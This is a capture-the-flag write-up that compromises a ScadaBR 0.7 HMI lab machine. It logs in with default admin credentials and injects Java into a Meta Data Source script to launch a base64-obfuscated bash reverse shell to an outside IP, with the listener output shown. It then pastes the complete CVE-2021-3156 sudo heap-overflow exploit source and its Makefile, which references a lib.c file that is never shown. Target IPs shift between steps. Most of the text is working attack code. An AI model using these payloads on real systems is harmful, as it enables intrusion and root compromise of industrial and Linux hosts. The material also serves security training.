# WEB

```Description
_Flags have been omitted from this writeup per platform guidelines._
 
A forgotten HMI node deep in Virelia’s wastewater control loop still runs an outdated instance, forked from an old Mango M2M stack.   
  
**Note:** The VM takes about **3 minutes** to boot up.
```

IP-Address
`*10.10.233.122*` 
Start With `RustScan`  
```bash 
rustscan -a 10.10.233.122
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
5901/tcp open  vnc-1      syn-ack
8080/tcp open  http-proxy syn-ack
```
then we surf on each port but while surfing on each port 
`PORT`  =  `80`, `5020`,  giving me 405 error and on port `5901` I got `RFB 003.008`
After this 
```bash 
curl -i http://10.10.254.64:8080 
HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/"236-1749599664000" Last-Modified: Tue, 10 Jun 2025 23:54:24 GMT Content-Type: text/html Content-Length: 236 Date: Sat, 28 Jun 2025 02:21:49 GMT <!DOCTYPE html> <html> <head> <title>ScadaBR CTF</title> <meta http-equiv="refresh" content="3; URL=/ScadaBR" /> </head> <body> <h1>Welcome to ScadaBR CTF</h1> <p>Redirecting you to <code>/ScadaBR</code>...</p> </body> </html>
```
Open in browser: `http://10.10.254.64:8080/ScadaBR` 
and Try Login with Default Credentials `admin : admin`
✅ Logged in successfully.

## 🔬 Version Info
```version
At the bottom of the page:
> ScadaBR 0.7 powered by Mango M2M
Confirmed it’s vulnerable to several **RCE exploits**:
- CVE-2015-7900 through CVE-2015-7904
- Meta Data Source script execution (known abuse vector)
```
## 💣 Exploiting Meta Data Source Script Injection

ScadaBR supports **Meta Data Sources**, which allow scripted logic on data points.
We can abuse this to execute arbitrary Java and get a reverse shell.

🔹 Step 1: Setup Listener
		`bash
		`nc -lvnp 4444`   `Attack Machine`

🔹 Step 2: Add Meta Data Source
		 - Navigate to **Data Sources**
		 - Click ➕ **Add Data Source**
		 - Type: `Meta`
		 - Name: `rce_exploit`
		 - Save
### 🔹 Step 3: Add Data Point with RCE
		1. Click ➕ **Add Point** under `rce_exploit`
		2. Set:
		    - Name: `exec_test`
		    - Data Type: `Alphanumeric`
		    - ✅ Check “Settable”

		`Scroll to the **Script** box and paste:`

```bash_java
var p = java.lang.Runtime.getRuntime().exec("bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjIxNS4xMzMvNDQ0NCAwPiYx}|{base64,-d}|bash");
```

This decodes and runs:
```bash
`/bin/bash -i >& /dev/tcp/10.10.215.133/4444 0>&1`
```
Save the Data Point
### 🔹 Step 4: Trigger the Payload

		1. Go to Point Details of `exec_test`
		2. Click Validate Script

#  `AttackBox_Machine`
Output
```bash 
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.55.209 57626
bash: cannot set terminal process group (275): Inappropriate ioctl for device
bash: no job control in this shell
tomcat7@d8c85df85285:/var/lib/tomcat7$ 
```

then run Commands 
#python_Spawn_stable
```bash 
tomcat7@d8c85df85285:/var/lib/tomcat7$ python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat7@d8c85df85285:/var/lib/tomcat7$ ls
ls
bin  common  conf  logs  root.txt  server  shared  webapps  work
tomcat7@d8c85df85285:/var/lib/tomcat7$ cat root.txt
cat root.txt
[flag omitted]
tomcat7@d8c85df85285:/var/lib/tomcat7$ 
```

## Source Code 

```c
hax.c 
/**
 ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
 ** ===========================================
 **
 ** Exploit for that sudo heap overflow thing everyone is talking about.
 ** This one aims for singleshot. Does not fuck with your system files.
 ** No warranties.
 **
 ** Shout outs to:
 **   Qualys      - for pumping out the awesome bugs
 **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
 **   dsc         - for letting me rack up his electricity bill
 **   my wife     - for all the quality time we had to skip
 **
 **  Enjoy!
 **
 **   -- blasty // 20210130
 **/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

// 512 environment variables should be enough for everyone
#define MAX_ENVP 512

typedef struct {
        char *target_name;
        char *sudoedit_path;
        uint32_t smash_len_a;
        uint32_t smash_len_b;
        uint32_t null_stomp_len;
        uint32_t lc_all_len; 
} target_t;

target_t targets[] = {
    {
        // Yes, same values as 20.04.1, but also confirmed.
        .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
    },
    {
        .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
    },
    {
        .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 64,
        .smash_len_b    = 49,
        .null_stomp_len = 60, 
        .lc_all_len     = 214
    }
};

void usage(char *prog) {
    printf("  usage: %s <target>\n\n", prog);
    printf("  available targets:\n");
    printf("  ------------------------------------------------------------\n");
    for(int i = 0; i < sizeof(targets) / sizeof(target_t); i++) {
        printf("    %d) %s\n", i, targets[i].target_name);
    }
    printf("  ------------------------------------------------------------\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    printf("\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n");

    if (argc != 2) {
        usage(argv[0]);
        return -1;
    }

    int target_idx = atoi(argv[1]);

    if (target_idx < 0 || target_idx >= (sizeof(targets) / sizeof(target_t))) {
        fprintf(stderr, "invalid target index\n");
        return -1;
    }

    target_t *target = &targets[ target_idx ];

    printf("using target: '%s'\n", target->target_name);

    char *smash_a = calloc(target->smash_len_a + 2, 1);
    char *smash_b = calloc(target->smash_len_b + 2, 1);

    memset(smash_a, 'A', target->smash_len_a);
    memset(smash_b, 'B', target->smash_len_b);

    smash_a[target->smash_len_a] = '\\';
    smash_b[target->smash_len_b] = '\\';

    char *s_argv[]={
        "sudoedit", "-s", smash_a, "\\", smash_b, NULL
    };

    char *s_envp[MAX_ENVP];
    int envp_pos = 0;

    for(int i = 0; i < target->null_stomp_len; i++) {
        s_envp[envp_pos++] = "\\";
    }
    s_envp[envp_pos++] = "X/P0P_SH3LLZ_";

    char *lc_all = calloc(target->lc_all_len + 16, 1);
    strcpy(lc_all, "LC_ALL=C.UTF-8@");
    memset(lc_all+15, 'C', target->lc_all_len);

    s_envp[envp_pos++] = lc_all;
    s_envp[envp_pos++] = NULL;

    printf("** pray for your rootshell.. **\n");

    execve(target->sudoedit_path, s_argv, s_envp);
    return 0;
}
```

## Makefile

```code 
Makefile 
all:
        rm -rf libnss_X
        mkdir libnss_X
        gcc -o sudo-hax-me-a-sandwich hax.c
        gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
clean:
        rm -rf libnss_X sudo-hax-me-a-sandwich
```

After following the Instruction we got the flag 

`Got the Flag` 
```Flag 
[flag omitted]
```

